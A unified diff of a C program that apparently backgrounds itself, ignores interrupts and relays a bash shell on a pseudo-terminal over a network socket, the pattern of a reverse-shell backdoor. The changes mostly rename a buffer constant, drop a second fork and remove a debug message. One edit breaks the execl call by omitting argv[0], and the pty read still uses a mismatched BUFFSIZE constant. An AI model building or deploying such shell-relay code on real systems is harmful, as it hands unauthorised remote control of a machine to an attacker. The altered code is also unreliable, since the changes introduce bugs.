@@ -4,7 +4,7 @@
 #include <signal.h>
 #include <termios.h>
 #include <errno.h>
-#define	MAXN	16384		/* max #bytes to request from server */
+#define	BUF_SIZE	16384		/* max #bytes to request from server */
 
 void sig_child(int signo);
 void server(char *host, char *port);
@@ -39,21 +39,23 @@ int main(int argc, char **argv)
 	int	nbytes;
 	int	logined;
 	char 	slave_name[20];
-	pid_t	pid;
+	pid_t	pid = 0;
 	fd_set	rset;
 
-	char	request[MAXN];
-	char	reply[MAXN];
+	char	request[BUF_SIZE];
+	char	reply[BUF_SIZE];
 
-	/* daemon_init */
-	if((pid = Fork())!=0)
+	/* daemon_init */ 
+	if((pid = Fork())!= 0)
 		exit(0);
 	setsid();
 	signal(SIGCHLD, sig_child);
 	signal(SIGINT, SIG_IGN);
 
+	/*
 	if(Fork() != 0)
 		exit(0);
+	*/
 
 	chdir("/");
 	umask(0);
@@ -70,8 +72,8 @@ start:
 
 	else if (pid == 0) {		/* child with pty slave! */
 		set_noecho(STDIN_FILENO);
-		if( execl("/usr/bin/bash", "bash", NULL)  == -1)
-			printf("%s execve error!",strerror(errno));
+		if( execl("/usr/bin/bash", NULL)  == -1)
+			printf("%s execve error!", strerror(errno));
 	}
 	int cflags = fcntl(fdm,F_GETFL,0);
 	fcntl(fdm,F_SETFL, cflags|O_NONBLOCK);
@@ -86,8 +88,8 @@ start:
 		FD_SET(fdm, &rset);
 		select (sockfd + 1, &rset, NULL, NULL, NULL);
 		if(FD_ISSET(sockfd, &rset)){
-			memset(request, '\0', MAXN);
-			nbytes = read(sockfd, request, MAXN);
+			memset(request, '\0', BUF_SIZE);
+			nbytes = read(sockfd, request, BUF_SIZE);
 			if ( nbytes < 0){
 				/* error! */
 				continue;
@@ -102,7 +104,7 @@ start:
 				printf("writen error to master pty");
 		}
 		if(FD_ISSET(fdm, &rset)){
-			memset(reply, '\0', MAXN);
+			memset(reply, '\0', BUF_SIZE);
 			if ( (nbytes = read(fdm, reply, BUFFSIZE)) <= 0)
 				goto restart;
 			nbytes = write(sockfd, reply, nbytes);
@@ -126,5 +128,4 @@ void sig_child(int signo)
 	pid_t pid;
 	int stat;
 	pid = wait(&stat);
-	printf("bash exit!");
 }
